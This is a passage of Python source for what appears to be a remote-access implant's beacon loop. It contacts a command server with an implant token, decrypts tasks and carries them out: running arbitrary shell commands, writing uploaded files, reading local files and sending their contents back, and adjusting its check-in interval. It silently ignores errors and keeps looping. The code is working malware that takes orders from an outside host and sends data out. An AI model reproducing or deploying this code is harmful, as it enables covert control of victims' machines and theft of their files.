   req=urllib.request.Request(C['url'],data=body,headers={'Content-Type':'application/json','X-Implant-Token':C['token']})
   r=json.loads(urllib.request.urlopen(req,timeout=30).read())
   msg=json.loads(dec(C['key'],r['d']))
   res=[]
   for t in msg.get('tasks') or []:
    out='';er=''
    try:
     if t['type']=='shell':out=run(t['command'])
     elif t['type']=='sleep':C['interval']=int(t.get('arg') or 5)
     elif t['type'] in ('exit','kill'):raise SystemExit
     elif t['type']=='upload':open(t['path'],'wb').write(base64.b64decode(t.get('data') or ''));out='uploaded'
     elif t['type']=='download':
      data=open(t['path'],'rb').read(2097153)
      if len(data)>2097152:raise ValueError('download exceeds 2 MiB')
      out=base64.b64encode(data).decode()
     else:raise ValueError('unsupported task type: '+str(t.get('type')))
    except Exception as e:er=str(e)
    res.append({'id':t['id'],'output':out,'error':er,'status':'failed' if er else 'success'})
   if res:
    m={'type':'result','session_id':msg.get('session_id'),'results':res}
    body=json.dumps({'d':enc(C['key'],json.dumps(m))}).encode()
    urllib.request.urlopen(urllib.request.Request(C['url'],data=body,headers={'Content-Type':'application/json','X-Implant-Token':C['token']}),timeout=30).read()
  except Exception:pass
  time.sleep(max(1,min(3600,int(C['interval']))))
